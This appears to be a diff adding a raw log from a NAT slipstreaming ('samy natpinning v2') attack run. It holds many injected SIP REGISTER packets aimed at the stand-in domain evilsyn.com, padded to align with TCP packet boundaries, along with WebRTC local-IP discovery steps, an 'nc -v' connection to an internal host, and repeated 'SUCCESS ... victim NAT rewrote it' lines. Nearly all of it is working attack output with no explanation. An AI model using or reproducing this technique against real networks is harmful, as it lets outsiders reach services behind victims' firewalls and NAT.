+<i>   ^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa010994310738759483bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------2026180541665791325338394038--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=29 (orig 29), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa010994310738759483bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------159992919820877220452051994680--
+   </i><br>injecting overflowed 2nd packet contents:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0   
+   Via: SIP/2.0/TCP <b><b>1.3.3.13</b></b>:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP   
+   Max-Forwards: 70   
+   Contact:<b> <sip:samy@1.3.3.13:<b>3306</b>;rinstance=v40f3f83b335139c;transport=TCP>   
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>   
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519   
+   Call-ID: aaaaaaaaaaaa010994310738759483bbbbbbZjQ4M2M.   
+   CSeq: 1 REGISTER   
+   Expires: 70   
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE   
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri   
+   User-Agent: samy natpinning v2   
+   Allow-Events: presence, kpml   
+   Content-Length: 0   
+      
+   </i><br>maximizing POST data over port 5060 to force "SIP packet" to begin on packet boundary<br>
+ready to traverse NAT/network/firewall, <b>press button above</b>...<br>stuff padding to fill tcp packet: <b>831 bytes</b><br>beacon received, packet capture lengths: {id:010994310738759483, stuff_bytes:831}<br>using first ip: <b>1.3.3.13</b><br>redirected to http to continue attack with localips in url<br>webrtc acquired ips: <b>1.3.3.13</b><br>created webrtc data channel to obtain local ip over https<br>sending TCP beacon to detect maximum packet size and MTU<br>responding to SYN with maximum segment size TCP option to control data size<br>requesting sniffed packet sizes from server<br>
+)
+
+192.168.1.197 1640247205: Array
+(
+    [C0] => {id:016541614772650093, stuff_bytes:831}
+)
+
+192.168.1.197 1640247224: Array
+(
+    [C9] => 192.168.1.197:11111: IT WORKS ON MY MACHINE
+<br><b>connected to 192.168.1.197:11111</b><br>
+<b>attempting to bypass your NAT/firewall</b><br>running: nc -v 192.168.1.197 11111<br><br><b>status: SUCCESS! ip in returned SIP packet is 192.168.1.197</b>, different than what we sent (<b>1.3.3.13</b>), victim NAT rewrote it<br><hr><br>offset=0 (orig 0), received this packet:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@192.168.1.197:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa016541614772650093bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------53565706312495102782016889384--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>new len 1487<br>old len 1514<br>offset same as last time, maybe something in HTTP header changed - adjusting packet length<br>offset=27 (orig 27), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa016541614772650093bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------17268354071675862797731577439--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=27 (orig 27), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa016541614772650093bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------16813486502054056232363588769--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=25 (orig 25), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa016541614772650093bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------1347540953847957141651420336--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=27 (orig 27), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa016541614772650093bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------10826709053471205771811300758--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=25 (orig 25), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa016541614772650093bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------9348801756883835601882935326--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=27 (orig 27), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa016541614772650093bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------26898192413841854011061327486--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=23 (orig 23), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa016541614772650093bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------991409751632722479396990291--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=25 (orig 25), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa016541614772650093bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------3256184262943284412057551003--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=21 (orig 21), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa016541614772650093bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------38538002838981740931370462--
+   </i><br>injecting overflowed 2nd packet contents:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0   
+   Via: SIP/2.0/TCP <b><b>1.3.3.13</b></b>:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP   
+   Max-Forwards: 70   
+   Contact:<b> <sip:samy@1.3.3.13:<b>11111</b>;rinstance=v40f3f83b335139c;transport=TCP>   
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>   
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519   
+   Call-ID: aaaaaaaaaaaa016541614772650093bbbbbbZjQ4M2M.   
+   CSeq: 1 REGISTER   
+   Expires: 70   
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE   
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri   
+   User-Agent: samy natpinning v2   
+   Allow-Events: presence, kpml   
+   Content-Length: 0   
+      
+   </i><br>maximizing POST data over port 5060 to force "SIP packet" to begin on packet boundary<br>
+ready to traverse NAT/network/firewall, <b>press button above</b>...<br>stuff padding to fill tcp packet: <b>831 bytes</b><br>beacon received, packet capture lengths: {id:016541614772650093, stuff_bytes:831}<br>using first ip: <b>1.3.3.13</b><br>redirected to http to continue attack with localips in url<br>webrtc acquired ips: <b>1.3.3.13</b><br>created webrtc data channel to obtain local ip over https<br>sending TCP beacon to detect maximum packet size and MTU<br>responding to SYN with maximum segment size TCP option to control data size<br>requesting sniffed packet sizes from server<br>
+)
+
+192.168.1.197 1640247488: Array
+(
+    [C0] => {id:03690221299601527, stuff_bytes:827}
+)
+
+192.168.1.197 1640247521: Array
+(
+    [C8] => 192.168.1.197:11111: IT WORKS ON MY MACHINE
+<br><b>connected to 192.168.1.197:11111</b><br>
+<b>attempting to bypass your NAT/firewall</b><br>running: nc -v 192.168.1.197 11111<br><br><b>status: SUCCESS! ip in returned SIP packet is 192.168.1.197</b>, different than what we sent (<b>1.3.3.13</b>), victim NAT rewrote it<br><hr><br>offset=0 (orig 0), received this packet:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@192.168.1.197:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa03690221299601527bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------16333161308264343641080170541--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>new len 1487<br>old len 1510<br>offset same as last time, maybe something in HTTP header changed - adjusting packet length<br>offset=23 (orig 23), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa03690221299601527bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------15471196335594220511969116812--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=23 (orig 23), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa03690221299601527bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------49971355517454198221783996197--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=17 (orig 17), received this packet:
+<i>   ^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa03690221299601527bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------58590651839953736255826770--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=21 (orig 21), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa03690221299601527bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------1918711368932956439688166076--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=23 (orig 23), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa03690221299601527bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------15534857601140541117607912041--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=25 (orig 25), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa03690221299601527bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------191983759218837828571777168284--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=17 (orig 17), received this packet:
+<i>   ^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa03690221299601527bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------50229454558892709327320029--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=21 (orig 21), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa03690221299601527bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------7361718342062834858931528006--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=23 (orig 23), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa03690221299601527bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------63386623411193506651620531697--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=21 (orig 21), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa03690221299601527bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------2670123131258537376509172317--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=17 (orig 17), received this packet:
+<i>   ^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
